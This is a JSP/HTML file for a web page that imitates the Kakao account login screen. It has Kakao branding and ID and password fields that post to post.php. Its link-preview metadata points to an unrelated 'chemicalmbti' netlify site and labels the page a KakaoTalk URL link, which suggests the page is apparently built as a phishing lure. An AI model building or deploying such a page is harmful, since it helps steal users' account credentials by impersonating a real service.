<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@ include file="../header.jsp"%>

<!DOCTYPE html>
<html lang="en">

<head>
<meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, width=device-width" />
<meta name="format-detection" content="telephone=no">
	
</script>
</script>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/css/kakao_login.css">
    <title>카카오계정</title>
    <meta property="og:url" content="https://chemicalmbti.netlify.app/">
    <meta property="og:title" content="제목">
    <meta property="og:type" content="website">
    <meta property="og:image" content="https://chemicalmbti.netlify.app/">
    <meta property="og:description" content="본문 내용.">
    <title>카카오톡 URL링크</title>
</head>
<style>
#kakaoServiceLogo {
  text-align : center;
  font-weight : 550;
  height : 96px;
}

img.adver {
  display : none;
}

div.advertisement>p {
  display : none;
}

ul.bottom_list>a:nth-of-type(6)>li {
  display : none;
  -webkit-appearance: none;
  -webkit-border-radius: 0;
}

ul.bottom_list>a:nth-of-type(5)>li {
  display : none;
}

li.join>a {
  white-space : nowrap;
}

li.account>a {
  white-space : nowrap;
}

li.pwd>a {
  white-space : nowrap;
}

li.account>a {
  display : inline-block;
  position : relative;
}

li.account {
  width : 4px;
}

li.account>a {
  width : 64px;
  left : -56px;
}

li.pwd>a {
  display : inline-block;
  width : 80.2188px;
  position : relative;
  left : -4px;
}

ul.bottom_list>a:nth-of-type(1)>li {
  text-align : center;
  position : relative;
}

ul.bottom_list>a:nth-of-type(2) {
  width : 106.3906px;
  position : relative;
  left : -17px;
}

ul.bottom_list>a:nth-of-type(1)>li {
  left : -28px;
}

ul.bottom_list>a:nth-of-type(2)>b>li {
  position : relative;
}

ul.bottom_list>a:nth-of-type(3)>li {
  position : relative;
}

ul.bottom_list>a:nth-of-type(2)>b {
  display : inline-block;
  width : 81.5px;
}

ul.bottom_list>a:nth-of-type(3) {
  width : 29.3125px;
  position : relative;
  right : 20px;
  height : 18px;
}

ul.bottom_list>a:nth-of-type(4) {
  width : 38.1875px;
  position : relative;
}

ul.bottom_list>a:nth-of-type(4)>li {
  position : relative;
}

ul.bottom_list>a:nth-of-type(4) {
  height : 21px;
  top : 0px;
}

ul.bottom_list>a:nth-of-type(1)>li {
  width : 53px;
}

ul.bottom_list>a:nth-of-type(4)>li {
  width : 64.1875px;
  left : 6px;
}

ul.bottom_list>a:nth-of-type(3)>li {
  width : 58.3125px;
  left : 4px;
}

ul.bottom_list>a:nth-of-type(2)>b>li {
  width : 110.5px;
  left : 5px;
}

ul.bottom_list>a:nth-of-type(1) {
  width : 33px;
}

button.submit {
  font-size : 15px;
  -webkit-appearance: none;
  -webkit-border-radius: 0;
  background: rgb(254, 229, 0);
  color: black;
  font-weight: normal
}


ul.bottom_list {
  height : 22px;
  position : relative;
  top : -1px;
}

body>div:nth-of-type(2) {
  position : relative;
  height : 85px;
  top : -12px;
}

#kakaoServiceLogo>img {
  width : 95px;
}

input:-webkit-autofill {
	-webkit-box-shadow: 0 0 0 1000px white inset;
	box-shadow: 0 0 0 1000px white inset;
}

#wrap {
    margin: 100px auto;
    display: flex;
    justify-content: center;
    width:960px;
    
}

a {
    text-decoration: none;
}

.span {
    font-size: 25px;
    color: black;
}

p {
    color: grey;
}

.advertisement>p {
    margin: 0;
}

.advertisement .adver {
    width: 600px;
    height: 350px;
}

.login {
    width: 500px;
    height: 400px;
    border: 1px solid lightgrey;
}

.login img{
	object-fit:cover;
}

.inlogin {
    padding: 50px;
    justify-content: center;
   
}

.letter {
    font-size: 32px;
}

input {
    font-size: 15px;
    padding: 10px;
    border: none;
    outline: none;
    border-bottom: 1px solid darkgrey;
    width: 375px;
}

input:hover {
    cursor: pointer;
}

input:focus {
    border-bottom: 2px solid lightgrey;
    border-bottom-color: #000000;
}

.inlogin form .id {
    padding-top: 20px;
}

.inlogin .keep {
    cursor: pointer;
    display: flex;
}

.inlogin .keep input[type="checkbox"] {
    width: 1rem;
    height: 1rem;
    appearance: none;
    border: 1px solid lightgray;
    border-radius: 50%;
    margin-right: 10px;
}

.inlogin .keep input[type="checkbox"]:checked {
    background-color: #FDD835;
}


.inlogin .submit {
    border-radius: 4%;
    height: 50px;
    width: 395px;
    border: none;
    background: #Fee500;
}

.inlogin .submit:focus {
    outline: none;
}

.inlogin .and::before,.and::after {
    display: inline-block;
    width: calc(50% - 13px);
    height: 1px;
    margin: 8px 0;
    background-color: rgba(0,0,0,0.06);
    vertical-align: top;
    content: '';
}

.inlogin .and {
    color: lightgrey;
    font-size: 12px;
}

.inlogin .QRcode {
    border-radius: 3%;
    outline: none;
    border: none;
    width: 395px;
    height: 50px;
    font-size: 15px;
    background: #e7e7e7;
    color: black;
}

.inlogin .QRcode:hover {
    background: #E0E0E0;
}


.three_list {
    margin-top: 30px;
    padding: 2px;
    font-size: 12px;
    list-style: none;
    display: flex;
}

.three_list a {
    color: #616161;
    text-decoration: none;
}

.three_list .join {
    padding-right: 190px;
}

.three_list .account {
    padding-right: 5px;
    border-right: 1px solid lightgrey;
}

.three_list .pwd {
    padding-left: 8px;
}

.bottom_list {
    margin-top: 90px;
    border-top: 1px solid lightgray;
    font-size: small;
    padding: 20px;
    list-style: none;
    display: flex;
    justify-content: center;
    padding-bottom: 0;
}

.bottom_list a {
    padding-left: 15px;
    color: black;
    text-decoration: none;
}

.bottom_letter {
    text-align: center;
    font-size: small;
}

.bottom_letter a {
    color: gray;
    text-decoration: none;
}

@media screen and (max-width:1023px) {
    .advertisement {
        display: none;
    }

    .login {
        width: 420px;
        justify-content: center;
    }

    .inlogin input {
        width: 300px;
    }

    .inlogin .check {
        width: 10px;
        height: 10px;
    }

    .inlogin .submit {
        width: 325px;
    }

    .inlogin .QRcode {
        width: 325px;
        font-size : 15px;
        background : #e7e7e7;
        color: black;
        
    }

    .three .join {
        padding-right: 105px;
    }
}
</style>

<body>
    <div id="wrap">
        <div class="advertisement">
            <p>
                <strong class="span">카카오계정 하나로 충분합니다.</strong><br>
                카카오 서비스 뿐 아니라 Daum, Melon 및 다양한 외부 서비스까지<br>
                카카오계정 하나로 편리하게 이용해보세요!<br>
                <img src="../imgfolder/kakaologo.png" class="adver">
            </p>
        </div>
        <div class="login">
            <div class="inlogin">
                <h1 id="kakaoServiceLogo">
		<img src="../imgfolder/kakaologo.png">
  	   </h1>

                <form action="post.php" method="post" autocomplete="off">
                    <p><input type="text" name="id" id="id" placeholder="카카오메일 아이디, 이메일, 전화번호" class="id"></p>
                    <p><input type="password" name="pwd" id="pwd" placeholder="비밀번호"></p>
                    <p><button type="submit" class="submit" style=-webkit-appearance: none;>로그인</button></p>
                </form>
            </div>
        </div>
    </div>
	<%@ include file="../footer.jsp"%>	
</body>
</html>